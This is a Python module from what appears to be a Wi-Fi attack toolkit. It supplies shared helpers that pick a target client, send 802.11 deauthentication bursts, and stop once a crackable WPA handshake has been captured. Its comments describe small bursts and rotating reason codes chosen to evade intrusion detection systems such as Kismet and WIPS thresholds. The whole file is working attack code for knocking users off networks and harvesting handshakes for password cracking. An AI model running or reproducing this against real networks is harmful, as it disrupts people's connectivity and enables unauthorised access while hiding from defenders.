"""Client targeting, deauth-flow control, and capture-quality reporting
shared by the attack chains (OMNI, Smart, PINCER, auto-deauth) -- one
place instead of each attack duplicating its own copy. Full history:
vault History.md, 2026-09-12 and 2026-09-13 entries.

- select_client() picks the strongest-signal known client.
- best_status() returns a capture's highest-quality HandshakeStatus.
- meets_threshold() checks a capture against an explicit minimum status
  (default CHALLENGE) instead of a hardcoded yes/no.
- run_deauth_flow() sends small bursts, stopping once meets_threshold()
  is true -- mirrors zizzania's (github.com/cyrus-and/zizzania) reactive
  model: deauth just enough to provoke a reconnect, then stop.
"""

from __future__ import annotations

import time

from ..frames import BROADCAST
from ..scan import AccessPoint
from .handshake import HandshakeCapture, HandshakeStatus

DEFAULT_BURST_SIZE = 16  # frames/round -- vs. deauth()'s own default of 64
DEFAULT_REASON_CODES = (1, 2, 3, 6, 7, 8, 15)  # multiple reason codes to cycle

_STATUS_RANK = {HandshakeStatus.NONE: 0, HandshakeStatus.CHALLENGE: 1, HandshakeStatus.AUTHORIZED: 2}


def select_client(ap: AccessPoint, preferred: str | None = None) -> str:
    """Pick a client for directed deauth.

    If ``preferred`` is still present in the AP's observed client set,
    honor that explicit UI selection. Otherwise use the strongest recorded
    signal, then an arbitrary known client, then broadcast.
    """
    if preferred and preferred in ap.clients:
        return preferred
    if ap.client_signal:
        return max(ap.client_signal, key=lambda mac: ap.client_signal[mac])
    return next(iter(ap.clients), BROADCAST)


def best_status(cap: HandshakeCapture) -> HandshakeStatus:
    """Highest-quality HandshakeStatus across every (ap, client) pair cap
    holds -- NONE if cap has no messages at all. Shared final-result
    reporting helper, for distinguishing AUTHORIZED from CHALLENGE-only
    in a caller's own result message instead of a bare yes/no.
    """
    if not cap.messages:
        return HandshakeStatus.NONE
    return max((cap.status(a, c) for a, c in cap.messages), key=lambda s: _STATUS_RANK[s])


def meets_threshold(cap: HandshakeCapture, min_status: HandshakeStatus = HandshakeStatus.CHALLENGE) -> bool:
    """True once cap's best_status() is at least min_status.

    Makes "how much handshake material is good enough to stop attacking"
    an explicit, named input every caller states, instead of an assumption
    baked into which helper they happened to call (History.md, 2026-09-13).
    Default CHALLENGE: any crackable material stops the attack. A caller
    that specifically needs AP-confirmed proof before stopping
    should pass HandshakeStatus.AUTHORIZED explicitly.
    """
    return _STATUS_RANK[best_status(cap)] >= _STATUS_RANK[min_status]


def run_deauth_flow(
    deauth_fn,
    iface: str,
    ap: AccessPoint,
    client: str,
    cap: HandshakeCapture,
    *,
    max_rounds: int,
    round_interval: float,
    burst_size: int = DEFAULT_BURST_SIZE,
    reason_codes: tuple[int, ...] = DEFAULT_REASON_CODES,
    min_status: HandshakeStatus = HandshakeStatus.CHALLENGE,
    stop_event=None,
    progress_fn=None,
) -> bool:
    """Send deauth rounds against (ap, client), checking cap between
    every round and stopping as soon as it meets min_status -- not
    waiting for the full max_rounds budget the way a fixed loop does.

    cap must be the SAME HandshakeCapture instance the caller's sniffer
    is filling in real time (pass it into capture_handshake(..., cap=cap)
    -- see attacks/handshake.py), not one obtained only after the
    listener finishes. Passing a cap that nothing is concurrently
    mutating just means this loop runs the full max_rounds, same as
    before.

    min_status: see meets_threshold() -- defaults to CHALLENGE (any
    crackable material). Pass HandshakeStatus.AUTHORIZED for a caller
    that specifically needs AP-confirmed proof before stopping.

    burst_size caps frames per round well below deauth()'s own default
    of 64 -- large bursts are what tend to trip rate-based WIDS/flood
    detection (e.g. Kismet's trend alerts, or a WIPS's fixed
    deauth-per-second threshold); a handful of frames is normally
    enough to provoke a reconnect, and stopping the moment EAPOL shows
    up cuts total frames sent far more than shrinking the burst alone.
    Callers that need to preserve a larger existing burst size (e.g.
    matching deauth()'s own 64-frame default) should pass it explicitly.

    reason_codes cycles the 802.11 reason code round to round instead
    of repeating one fixed value every time -- a minor extra layer
    against signature-based detection of a constant reason code.

    Returns True if cap already met min_status when the loop ended
    (whether from a round or from stop_event/max_rounds), letting the
    caller skip logging a round that no longer needs one; the caller
    still inspects cap itself (e.g. via best_status()) for the actual
    capture quality.
    """
    log = progress_fn or (lambda msg: None)
    for round_no in range(1, max_rounds + 1):
        if stop_event is not None and stop_event.is_set():
            return meets_threshold(cap, min_status)
        if meets_threshold(cap, min_status):
            log(f"handshake material already captured -- stopping deauth after {round_no - 1}/{max_rounds} round(s)")
            return True
        reason = reason_codes[(round_no - 1) % len(reason_codes)]
        sent = deauth_fn(iface, ap.bssid, client=client, count=burst_size, channel=ap.channel, reason=reason, progress_fn=log)
        if sent == 0:
            log(f"deauth round {round_no}/{max_rounds}: did NOT go out to {client}")
        else:
            log(f"deauth round {round_no}/{max_rounds}: sent {sent} frame(s) to {client} (reason={reason})")
        timed_out = stop_event.wait(round_interval) if stop_event is not None else _plain_wait(round_interval)
        if timed_out:
            return meets_threshold(cap, min_status)
    return meets_threshold(cap, min_status)


def _plain_wait(seconds: float) -> bool:
    """time.sleep() shaped like Event.wait() (always returns False) for
    callers that don't pass a stop_event."""
    time.sleep(seconds)
    return False
